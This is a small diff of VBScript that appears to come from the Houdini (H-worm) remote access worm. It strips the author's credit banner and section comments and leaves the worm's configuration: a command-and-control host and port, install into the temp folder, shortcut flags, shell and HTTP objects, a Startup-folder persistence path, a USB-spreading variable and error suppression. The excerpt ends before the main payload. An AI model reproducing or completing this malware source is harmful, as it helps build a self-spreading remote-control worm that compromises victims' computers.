@@ -1,14 +1,8 @@
-'<[ recoder : houdini (c) skype : houdini-fx ]>
-
-'=-=-=-=-= config =-=-=-=-=-=-=-=-=-=-=-=-=-=-=
-
 host = "localhost"
 port = 1337
 installdir = "%temp%"
 lnkfile = true
 lnkfolder = true
-
-'=-=-=-=-= public var =-=-=-=-=-=-=-=-=-=-=-=-=
 
 dim shellobj 
 set shellobj = wscript.createobject("wscript.shell")
@@ -17,8 +11,6 @@ set filesystemobj = createobject("scripting.filesystemobject")
 dim httpobj
 set httpobj = createobject("msxml2.xmlhttp")
 
-
-'=-=-=-=-= privat var =-=-=-=-=-=-=-=-=-=-=-=
 
 installname = wscript.scriptname
 startup = shellobj.specialfolders ("startup") & "\"
@@ -34,7 +26,6 @@ usbspreading = ""
 startdate = ""
 dim oneonce
 
-'=-=-=-=-= code start =-=-=-=-=-=-=-=-=-=-=-=
 on error resume next
 
 
